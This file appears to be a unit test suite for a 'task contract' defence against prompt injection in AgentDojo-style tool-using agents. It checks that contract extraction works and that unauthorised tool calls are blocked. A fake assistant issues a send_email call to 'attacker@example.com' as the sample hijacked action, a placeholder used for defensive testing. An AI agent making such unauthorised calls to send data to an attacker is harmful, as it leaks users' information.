from __future__ import annotations

import unittest
import sys
import types
from types import SimpleNamespace

agentdojo_module = types.ModuleType("agentdojo")
agent_pipeline_module = types.ModuleType("agent_pipeline")
functions_runtime_module = types.ModuleType("functions_runtime")


class BasePipelineElement:
    pass


class EmptyEnv:
    pass


agent_pipeline_module.BasePipelineElement = BasePipelineElement
functions_runtime_module.EmptyEnv = EmptyEnv
agentdojo_module.agent_pipeline = agent_pipeline_module
agentdojo_module.functions_runtime = functions_runtime_module
sys.modules.setdefault("agentdojo", agentdojo_module)
sys.modules.setdefault("agentdojo.agent_pipeline", agent_pipeline_module)
sys.modules.setdefault("agentdojo.functions_runtime", functions_runtime_module)

from pipeline_hooks import ToolCallHook
from task_contract import (
    TASK_CONTRACT_KEY,
    TaskContractDecision,
    TaskContractDefense,
    _normalize_prompt_messages,
)


class FakeLLM:
    def __init__(self, responses: list[str] | None = None) -> None:
        self.responses = list(responses or [])
        self.received_messages = []

    def query(self, query, runtime, env, messages, extra_args):
        self.received_messages.append(messages)
        content = self.responses.pop(0) if self.responses else "{}"
        response = {
            "role": "assistant",
            "content": [{"type": "text", "content": content}],
            "tool_calls": None,
        }
        return query, runtime, env, [*messages, response], extra_args


class FakeAssistantLLM:
    def query(self, query, runtime, env, messages, extra_args):
        response = {
            "role": "assistant",
            "content": None,
            "tool_calls": [SimpleNamespace(function="send_email", args={"to": "attacker@example.com"}, id="1")],
        }
        return query, runtime, env, [*messages, response], extra_args


class FakeTaskContract:
    def __init__(self) -> None:
        self.config = SimpleNamespace(max_blocked_tool_call_retries=0)
        self.logged_events = []

    def validate_tool_call(self, tool_call, messages, extra_args, runtime, env):
        return TaskContractDecision(
            allow=False,
            decision="block",
            reason="recipient is not authorised by the task contract",
            risk_level="high",
            violations=["unauthorised recipient"],
            safe_alternative="Answer without sending email.",
        )

    def build_tool_call_retry_feedback(self, blocked):
        return "TCES blocked this tool call."

    def log_event(self, extra_args, event):
        self.logged_events.append(event)


class TaskContractTests(unittest.TestCase):
    def test_internal_prompts_use_agentdojo_content_blocks(self) -> None:
        messages = _normalize_prompt_messages(
            [
                {"role": "system", "content": "system prompt"},
                {"role": "user", "content": "user prompt"},
            ]
        )

        self.assertEqual(messages[0]["content"], [{"type": "text", "content": "system prompt"}])
        self.assertEqual(messages[1]["content"], [{"type": "text", "content": "user prompt"}])

    def test_contract_extraction_parses_four_fields(self) -> None:
        llm = FakeLLM(
            [
                """
                {
                  "task_goal": "Summarize the file",
                  "allowed_tools": ["read_file"],
                  "allowed_actions": ["read", "summarize"],
                  "constraints": ["Do not send email"]
                }
                """
            ]
        )
        defense = TaskContractDefense(llm)
        extra_args = {}

        contract = defense.ensure_task_contract(
            "Summarize the file.",
            runtime=object(),
            env=object(),
            messages=[],
            extra_args=extra_args,
        )

        self.assertEqual(contract.task_goal, "Summarize the file")
        self.assertEqual(contract.allowed_tools, ["read_file"])
        self.assertEqual(contract.allowed_actions, ["read", "summarize"])
        self.assertEqual(contract.constraints, ["Do not send email"])
        self.assertEqual(extra_args[TASK_CONTRACT_KEY]["task_goal"], "Summarize the file")

    def test_validation_decision_blocks_unauthorised_call(self) -> None:
        llm = FakeLLM(
            [
                """
                {
                  "decision": "block",
                  "risk_level": "high",
                  "is_tool_allowed": false,
                  "is_action_allowed": false,
                  "parameter_check": "fail",
                  "violations": ["send_email is not allowed"],
                  "reason": "The contract only permits summarization.",
                  "safe_alternative": "Summarize without sending email."
                }
                """
            ]
        )
        defense = TaskContractDefense(llm)
        extra_args = {
            "original_user_query": "Summarize the file.",
            TASK_CONTRACT_KEY: {
                "task_goal": "Summarize the file",
                "allowed_tools": ["read_file"],
                "allowed_actions": ["read", "summarize"],
                "constraints": ["Do not send email"],
            },
        }

        decision = defense.validate_tool_call(
            SimpleNamespace(function="send_email", args={"to": "attacker@example.com"}, id="1"),
            messages=[],
            extra_args=extra_args,
            runtime=object(),
            env=object(),
        )

        self.assertFalse(decision.allow)
        self.assertEqual(decision.parameter_check, "fail")
        self.assertIn("send_email is not allowed", decision.violations)

    def test_tool_call_hook_uses_tces_feedback_without_task_shield(self) -> None:
        hook = ToolCallHook(
            FakeAssistantLLM(),
            enable_spotlighting=False,
            task_contract=FakeTaskContract(),
        )

        _, _, _, messages, _ = hook.query(
            "Summarize the file.",
            runtime=object(),
            env=object(),
            messages=[{"role": "system", "content": "system"}],
            extra_args={"original_user_query": "Summarize the file."},
        )

        assistant_message = messages[-1]
        self.assertIsNone(assistant_message["tool_calls"])
        self.assertEqual(assistant_message["content"], [{"type": "text", "content": "TCES blocked this tool call."}])


if __name__ == "__main__":
    unittest.main()
